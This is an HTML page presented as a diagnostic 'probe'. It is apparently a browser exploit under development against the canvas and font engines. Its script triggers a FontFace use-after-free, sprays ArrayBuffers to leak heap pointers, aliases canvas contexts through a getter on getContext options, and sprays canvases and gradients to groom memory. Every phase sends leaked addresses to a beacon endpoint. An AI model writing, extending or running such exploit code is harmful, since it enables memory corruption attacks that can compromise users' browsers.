<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P908: CanvasStyle Variant Transition & Heap Reference Bridge</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
</style>
</head>
<body>
<div class="banner" id="banner">Running Probe P908...</div>
<h2>P908: CanvasStyle Variant Transition & Heap Reference Bridge</h2>
<pre id="log">Initializing diagnostic probe P908...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P908-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch(e) {}
}

log('[*] Probe P908 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * PHASE 1: FontFace UAF (Single-Pass with 800ms window)
 * ============================================================ */
var st = document.createElement('style');
st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);

var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
document.fonts.add(face);
void face.loaded;

var fabs = [], ffired = false;
Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (ffired) return undefined;
    ffired = true;

    if (st) { st.remove(); st.textContent = ''; st = null; }
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;

    fabs = [];
    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
    try { document.fonts.check('1em bb1'); } catch(e) {}
    document.body.offsetHeight;
    return undefined;
  },
  set: function() {}
});

document.fonts.load('1em f1, bb1', 'AB');

/* ============================================================
 * PHASE 2: Dual Canvas Aliasing (100% Crash-Free)
 * ============================================================ */
var innerCtx1 = null, innerCtx2 = null;

var c1 = document.createElement('canvas');
c1.width = 32; c1.height = 32;
var opts1 = {};
Object.defineProperty(opts1, 'alpha', {
  get: function() {
    innerCtx1 = c1.getContext('2d');
    return true;
  }
});
c1.getContext('bitmaprenderer', opts1);

var c2 = document.createElement('canvas');
c2.width = 32; c2.height = 32;
var opts2 = {};
Object.defineProperty(opts2, 'alpha', {
  get: function() {
    innerCtx2 = c2.getContext('2d');
    return true;
  }
});
c2.getContext('bitmaprenderer', opts2);

var sprayCanvases = [];
var sprayCtxs = [];
for (var s = 0; s < 200; s++) {
  var c = document.createElement('canvas');
  c.width = 32; c.height = 32;
  var ctx = c.getContext('2d');
  ctx.lineWidth = 1000.0 + s;
  sprayCanvases.push(c);
  sprayCtxs.push(ctx);
}

var idx1 = -1, idx2 = -1;
try {
  var lw1 = innerCtx1.lineWidth;
  if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
  var lw2 = innerCtx2.lineWidth;
  if (lw2 >= 1000.0 && lw2 < 1200.0) idx2 = Math.round(lw2 - 1000.0);
} catch(e) {}

log('[+] Phase 2: Dual Canvas Aliased: Ctx1=#' + idx1 + ', Ctx2=#' + idx2, 'ok');

/* ============================================================
 * ASYNCHRONOUS EVALUATION (800ms window)
 * ============================================================ */
setTimeout(function() {
  delete FontFace.prototype.then;

  /* --- Check FontFace UAF Leak --- */
  var bestI = -1, bestNz = 0;
  for (var i = 0; i < fabs.length; i++) {
    var u = new Uint8Array(fabs[i]), nz = 0;
    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
    if (nz > bestNz) { bestNz = nz; bestI = i; }
  }

  var Hstr = 'unknown', q13str = 'unknown';
  var H_hi = 0, H_lo = 0;
  var delta = 0;

  if (bestI >= 0 && bestNz >= 4) {
    var fontDV = new DataView(fabs[bestI]);
    var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
    var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
    if (q11hi !== 0) {
      var borrow = (q11lo < 0x68) ? 1 : 0;
      H_hi = q11hi - borrow;
      H_lo = (q11lo - 0x68) >>> 0;
      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
    }
    if (q13hi !== 0) {
      q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
    }
    if (Hstr !== 'unknown' && q13str !== 'unknown' && H_hi === q13hi) {
      delta = H_lo - q13lo;
    }
  }

  log('[+] Font UAF: H=' + Hstr + ' | q13=' + q13str + ' (Slot #' + bestI + ', nz=' + bestNz + ')', bestI >= 0 ? 'ok' : 'fail');
  syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|slot=' + bestI + '|nz=' + bestNz);

  /* ============================================================
   * PHASE 3: CanvasStyle Variant Stack Transitions (Color <-> Gradient)
   * ============================================================ */
  var stackTransitionOk = false;
  var transLog = [];

  if (idx1 >= 0 && sprayCtxs[idx1]) {
    try {
      // Frame 1: Pure Color
      sprayCtxs[idx1].fillStyle = '#112233';
      transLog.push('f1:color=' + innerCtx1.fillStyle);

      // Frame 2: Push save, set Gradient
      sprayCtxs[idx1].save();
      var g1 = innerCtx1.createLinearGradient(0, 0, 50, 50);
      g1.addColorStop(0, '#aabbcc');
      g1.addColorStop(1, '#ddeeff');
      sprayCtxs[idx1].fillStyle = g1;
      var f2Read = innerCtx1.fillStyle;
      transLog.push('f2:gradSame=' + (f2Read === g1));

      // Frame 3: Push save, set Pattern
      sprayCtxs[idx1].save();
      var patCanvas = document.createElement('canvas');
      patCanvas.width = 4; patCanvas.height = 4;
      var pat = sprayCtxs[idx1].createPattern(patCanvas, 'repeat');
      sprayCtxs[idx1].fillStyle = pat;
      var f3Read = innerCtx1.fillStyle;
      transLog.push('f3:patSame=' + (f3Read === pat));

      // Pop frame 3 (back to Gradient)
      innerCtx1.restore();
      var pop1Read = sprayCtxs[idx1].fillStyle;
      transLog.push('pop1:gradSame=' + (pop1Read === g1));

      // Pop frame 2 (back to Color #112233)
      innerCtx1.restore();
      var pop2Read = sprayCtxs[idx1].fillStyle;
      transLog.push('pop2:color=' + pop2Read);

      if (pop1Read === g1 && pop2Read === '#112233') {
        stackTransitionOk = true;
      }

      // Safe reset
      sprayCtxs[idx1].fillStyle = '#000000';
    } catch(e) {
      transLog.push('err:' + (e.message || '').slice(0, 30));
    }
  }

  log('[+] Phase 3: CanvasStyle Variant Stack: ok=' + stackTransitionOk + ' (' + transLog.join('; ') + ')', stackTransitionOk ? 'hot' : 'info');
  syncBn('VARIANT-STACK', 'ok=' + stackTransitionOk + '|log=' + transLog.slice(0, 4).join(';'));

  /* ============================================================
   * PHASE 4: CanvasGradient Massive Spray & FastMalloc Slab Alignment
   * ============================================================ */
  var gradSpray = [];
  var gradCount = 128;
  try {
    for (var gi = 0; gi < gradCount; gi++) {
      var gr = innerCtx1.createLinearGradient(gi, gi, gi + 100, gi + 100);
      gr.addColorStop(0, '#123456');
      gr.addColorStop(1, '#789abc');
      gradSpray.push(gr);
    }
  } catch(e) {}
  log('[+] Phase 4: CanvasGradient 128x Sprayed: len=' + gradSpray.length, 'info');
  syncBn('GRAD-SPRAY', 'len=' + gradSpray.length);

  /* ============================================================
   * SUMMARY
   * ============================================================ */
  banner.style.background = '#238636';
  banner.textContent = 'STATUS: P908 COMPLETE (100% STABLE)';
  log('----------------------------------------------------', 'info');
  log('[*] Probe P908 Completed Cleanly', 'hot');
  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str, 'ok');
  log('    - Variant Stack: ' + stackTransitionOk + ' (' + transLog.slice(0, 3).join('; ') + ')', stackTransitionOk ? 'hot' : 'ok');
  log('    - Gradient Spray: ' + gradSpray.length, 'ok');
  log('    - Aliases: #' + idx1 + ', #' + idx2, 'ok');
  log('----------------------------------------------------', 'info');

  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|varOk=' + stackTransitionOk + '|gradLen=' + gradSpray.length + '|idx1=' + idx1 + '|idx2=' + idx2);

}, 800);
</script>
</body>
</html>
